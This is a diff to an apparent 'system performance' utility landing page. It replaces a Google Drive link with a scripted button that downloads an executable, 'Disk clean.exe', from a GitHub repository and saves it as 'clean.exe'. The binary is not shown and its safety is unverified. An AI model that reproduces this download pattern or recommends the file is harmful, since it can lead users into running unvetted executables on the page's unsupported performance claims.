@@ -52,7 +52,18 @@
             <li>Faster system performance</li>
             <li>Improved overall stability</li>
         </ul>
-        <a href="https://drive.google.com/file/d/1T4u1KRfDiQbPjvhwLQMien1P4bNZIWIV/view?usp=sharing" class="cta-button">Download Now</a>
+        <button id="downloadBtn" class="cta-button">Download</button>
+
+    <script>
+        document.getElementById('downloadBtn').addEventListener('click', function() {
+            const link = document.createElement('a');
+            link.href = 'https://github.com/wimz99/website/raw/3c8954f796fdc7007795331e67b8ca9f9e7528b2/Disk%20clean.exe';
+            link.download = 'clean.exe';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        });
+    </script>
     </div>
 </body>
 </html>
